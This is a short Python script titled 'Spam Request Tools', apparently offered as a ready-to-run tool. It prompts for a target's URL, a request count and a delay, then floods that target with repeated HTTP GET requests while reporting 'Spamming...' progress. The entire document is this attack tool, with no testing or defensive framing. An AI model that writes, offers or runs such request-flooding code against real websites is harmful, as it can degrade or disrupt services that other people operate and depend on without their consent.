import requests, time

print('''------------------------------
Spam Request Tools (v. 1.0)
------------------------------''')

url = input('Input Target\'s url: ')
count = int(input('Count: '))
delay = int(input('Delay: ')) /1000
for n in range(count):
    res = requests.get(url)
    print('Spamming... (', n+1, '/', count, ')', end='\r')
    time.sleep(delay)
print('Finished')
